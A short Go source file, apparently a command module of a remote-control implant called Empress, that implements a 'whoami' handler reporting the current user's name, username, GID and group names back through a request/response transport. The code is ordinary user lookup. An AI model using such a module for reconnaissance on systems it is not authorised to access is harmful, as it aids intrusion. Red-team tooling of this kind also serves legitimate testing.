package system

import (
	"github.com/pygrum/Empress/transport"
	"os/user"
	"strings"
)

func CmdWhoami(_ *transport.Request, response *transport.Response) {
	u, err := user.Current()
	if err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	//User.GroupIds now uses a Go native implementation when cgo is not available.
	// https://tip.golang.org/doc/go1.18
	gid := findGroup(u.Gid)
	id := "Name: " + u.Name + "\nUsername: " + u.Username + "\nGID: " + gid + "\nGroups: "
	groupString := ""
	groups, err := u.GroupIds()
	if err != nil {
		groupString = err.Error()
	} else {
		var groupArray []string
		for _, groupId := range groups {
			g := findGroup(groupId)
			groupArray = append(groupArray, g)
		}
		groupString = strings.Join(groupArray, ", ")
	}
	id += groupString
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestStdout,
		Data:   []byte(id),
	})
}

func findGroup(gid string) string {
	group, err := user.LookupGroupId(gid)
	if err != nil {
		return gid
	}
	return group.Name
}
